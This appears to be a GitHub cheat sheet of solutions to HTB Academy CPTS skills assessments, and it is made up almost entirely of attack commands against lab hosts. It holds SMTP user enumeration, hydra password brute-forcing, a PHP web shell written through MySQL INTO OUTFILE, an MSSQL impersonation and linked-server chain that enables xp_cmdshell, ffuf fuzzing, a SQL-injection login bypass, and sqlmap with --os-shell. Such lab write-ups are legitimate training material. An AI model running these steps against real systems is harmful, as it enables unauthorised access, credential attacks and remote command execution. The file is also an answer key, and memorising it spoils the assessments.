https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md

---
### Attacking Common Services:
---
#### Attacking Common Services - Easy:
```
UserEnum:       smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t $ip
PW Bruteforce:  hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt $ip smtp
Login MySQL:    mysql -h $ip -u <user> -p <password>
SQL RCE:        SELECT "<?php if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; } ?>" INTO OUTFILE 'C:/xampp/htdocs/cmd.php';
RCE:            curl http://$ip/cmd.php?cmd=whoami
```
#### Attacking Common Services - Medium:
```
nmap scan:      nmap $ip -p- --open -o nmap.txt | grep '/tcp' | cut -d'/' -f1 | paste -sd, -
ftp anonymous:  ftp $ip 30021
download file:  get mynotes.txt
PW Bruteforce:  hydra -l simon -P mynotes.txt $ip ssh OR hydra -l simon -P mynotes.txt $ip pop3
Login:          ssh simon@$ip
```

#### Attacking Common Services - Hard:
```
-- 1. Get the names of all databases in the SQL Server instance
SELECT name FROM master.dbo.sysdatabases;
GO

-- 2. Switch to the 'TestingDB' database for further queries
USE TestingDB;
GO

-- 3. Get all tables from the 'TestAppDB' database
SELECT table_name FROM TestAppDB.INFORMATION_SCHEMA.TABLES;
GO

-- 4. Find distinct names of principals who have the 'IMPERSONATE' permission
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO

-- 5. Execute as the 'john' login and check the current user and sysadmin membership
EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;  -- Get the current user
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Check if the user is a sysadmin
GO

-- 6. Get information about linked servers and remote status
SELECT srvname, isremote FROM sys.servers;
GO

-- 7. Enable 'show advanced options' on the linked server
EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1;
GO

-- 8. Apply the configuration changes (RECONFIGURE)
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 9. Execute a query on the linked server to get server details and check sysadmin role
EXECUTE ('SELECT @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 10. Enable 'show advanced options' on the linked server using EXECUTE
EXECUTE ('EXEC sp_configure ''show advanced options'', 1;') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 11. Apply the configuration (RECONFIGURE) on the linked server using EXECUTE
EXECUTE ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 12. Enable 'xp_cmdshell' on the linked server
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1;') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 13. Execute a command on the linked server using 'xp_cmdshell' to interact with the file system
EXECUTE ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt > C:\Users\fiona\Desktop\xc.txt''') AT [LOCAL.TEST.LINKED.SRV];
GO
```
---
### Attacking Web Applications with Ffuf:
---
#### Skills Assessment - Web Fuzzing:
```
Subdomain Fuzzing:            ffuf -u http://academy.htb:54143 -H "Host:FUZZ.academy.htb:54143" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 423
Extension Fuzzing:            ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:54143/indexFUZZ
Page Fuzzing:                 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FUZZ -u http://faculty.academy.htb:54143/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287
Parameter Fuzzing (POST):     ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:49893/courses/linux-security.php7 -X POST -d "FUZZ=key" -H "Content-Type: application/x-www-form-urlencoded" -fs 774
Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:49893/courses/linux-security.php7 -X POST -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 781
     
```

---
### SQL Injection Fundamentals:
---
#### Skills Assessment :

#### For the login:
``` admin' or '1'='1'-- - ```
#### After the login (copy the the request from the browser as cURL):
``` sqlmap 'http://94.237.62 <SNIP> .php' -H 'Cookie: PHPSESSID=avgi9hf5r3hj0kfuh4573o7rr6' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'search=sdsdsds' --data 'search=*' --os-shell --batch
 ```
